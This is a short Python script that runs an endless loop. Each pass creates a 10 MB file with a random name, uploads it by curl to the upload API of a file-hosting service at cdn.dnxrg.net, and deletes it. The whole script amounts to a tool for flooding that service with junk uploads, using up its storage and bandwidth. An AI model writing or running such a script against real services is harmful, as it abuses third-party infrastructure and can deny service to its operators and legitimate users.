import os
import time
import random
low_word = "abcdefghijklkmnopqrstuvwxyz"
username_for = low_word
long_username = 12

while True:
    usernamerepl = "".join(random.sample(username_for, long_username))
    os.system("fallocate -l 10M "+usernamerepl)
    os.system("curl --form myFile='@"+usernamerepl+"' https://cdn.dnxrg.net/api/upload")
    os.system("rm "+usernamerepl)
